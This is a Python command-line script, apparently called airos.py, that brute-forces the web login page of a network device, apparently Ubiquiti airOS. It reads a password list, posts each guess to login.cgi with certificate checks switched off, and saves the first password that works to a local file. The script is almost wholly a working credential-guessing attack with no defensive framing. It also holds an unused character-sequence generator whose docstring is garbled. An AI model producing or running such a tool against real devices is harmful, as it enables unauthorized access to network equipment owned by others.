#!/usr/bin/env python3
import string 
import sys, os, time
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ALLOWED_CHARACTERS = string.printable 
NUMBER_OF_CHARACTERS = len(ALLOWED_CHARACTERS) 

def characterToIndex(char):
    return ALLOWED_CHARACTERS.index(char) 

def indexToCharacter(index):
    if NUMBER_OF_CHARACTERS <= index:
        raise ValueError("Index out of range.")
    else:
        return ALLOWED_CHARACTERS[index] 

def next(string):
    """ Get next sequence of characters.
        Treats characters as numbers (0-255). 
        Function tries to increment
        character at the first position. If it fails, new character is
        added to the back of the list.
        It's basically a number with base = 256.
        :param string: A list of characters (can be empty). 
        :type string: list return: Next list of characters in 
        :the sequence rettype: list
    """
    if len(string) <= 0:
        string.append(indexToCharacter(0))
    else:
        string[0] = indexToCharacter((characterToIndex(string[0]) + 1) % NUMBER_OF_CHARACTERS)
        if characterToIndex(string[0]) == 0:
            return list(string[0]) + next(string[1:])
    return string 

# This function checks the state of the server in case it is down!!
def is_alive(remoteHost):
    try:
        response = requests.get(f"https://{remoteHost[0]}", verify=False, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print(f"[-] Server responded with status code {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"[-] Server is down or not reachable: {e}")
        return False

def attack(remoteHost, username, passwords):
    session = requests.Session()
    login_url = f"https://{remoteHost[0]}/login.cgi?uri=/index.cgi"
    try:
        if is_alive(remoteHost):
            for password in passwords:
                password = password.strip()
                data = {'username': username, 'password': password}
                response = session.post(login_url, data=data, verify=False)
                if 'Invalid credentials' in response.text:
                    print(f"[Error] Username: ({username}) password: ({password})")
                else:
                    print(f"[YES] {password}")
                    print("Password found!!")
                    with open("/opt/Network_password/network_middle.txt", "w") as f:
                        f.write(password)
                    sys.exit(0)
            print("End of password list")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"[-] System halt (2) restarting!! Error: {e}")
        pass

# Ensure a URL and password file are provided
if len(sys.argv) < 3:
    print("Syntax error: ./airos.py url password_file")
    sys.exit(1)

in_url = sys.argv[1] # Server (url)
password_file = sys.argv[2] # Password file
remoteHost = (in_url.split('/')[2], 80)

print(remoteHost)
if is_alive(remoteHost):
    username = input("Enter user name:")
else:
    print("[-] Server is down, nothing to do!!")
    sys.exit()

try:
    with open(password_file, 'r') as file:
        passwords = file.readlines()
except Exception as e:
    print(f"Error reading password file: {e}")
    sys.exit(1)

if len(sys.argv) == 3:
    print("Scanning!!")
else:
    print("Syntax error: ./airos.py url password_file")
    sys.exit(0)

attack(remoteHost, username, passwords)
